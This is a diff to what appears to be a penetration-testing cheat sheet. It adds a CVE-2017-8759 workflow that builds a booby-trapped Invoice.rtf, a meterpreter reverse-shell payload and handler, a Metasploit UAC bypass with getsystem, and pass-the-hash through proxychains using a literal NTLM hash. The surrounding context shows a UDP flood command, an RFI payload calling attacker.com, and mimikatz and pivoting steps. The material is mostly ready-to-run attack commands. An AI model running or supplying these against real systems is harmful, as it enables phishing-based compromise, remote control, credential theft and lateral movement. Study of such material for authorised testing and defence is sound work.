@@ -37,6 +37,21 @@ UDP(Volume Based Attack) : hping3 --UDP --flood -p 80 <TARGET>
 ## LFI&RFI&SSRF
 render.php?include=http://attacker.com  
 
+# Document Exploit
+## CVE-2017-8759
+git clone https://github.com/bhdresh/CVE-2017-8759
+cd CVE-2017-8759
+python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.210.100/logo.txt
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.210.100 LPORT=4444 -f exe > /tmp/shell.exe
+msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.210.100; run"
+python cve-2017-8759_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
+python -m SimpleHTTPServer 8080
+## Bypassing UAC
+(Metasploit) use exploit/windows/local/bypassuac
+set SESSION 1
+exploit
+getsystem
+
 # Lateral Movement
 ## normal reconnaissance
 tasklist  
@@ -93,13 +108,14 @@ mimikatz.exe
 
 ## Pass-the-hash
 git clone https://github.com/byt3bl33d3r/pth-toolkit  
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  
 pth-winexe -U hash //IP cmd  
 ./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' //192.168.210.102 cmd.exe  
 sc query winexesvc  
 sc start winexesvc  
 ./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' --system //192.168.210.102 cmd.exe  
 xfreerdp /u:user /d:domain /pth:hash /v:IPAddress
+
 
 ## WCE64.exe
 /usr/share/wce  
@@ -125,11 +141,13 @@ wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  administrator@192.168.255.10
 ## Pivoting network
 (meterpreter) run autoroute -s 192.168.255.0/24  
 (meterpreter) run post/windows/gather/arp_scanner rhosts=192.168.255.0/24  
+(meterpreter) backgroupd
 (msf) use auxiliary/server/socks4a  
 (msf) set SRVHOST 0.0.0.0  
 (msf) set SRVPORT 9999  
 (msf) exploit  
-Edit /etc/proxychains.conf  
+gedit /etc/proxychains.conf  
+proxychains pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' --system //192.168.255.10 cmd.exe  
 proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 192.168.255.10  
 proxychains wmiexec.py -debug john:P@ssw0rd@192.168.255.10  
 
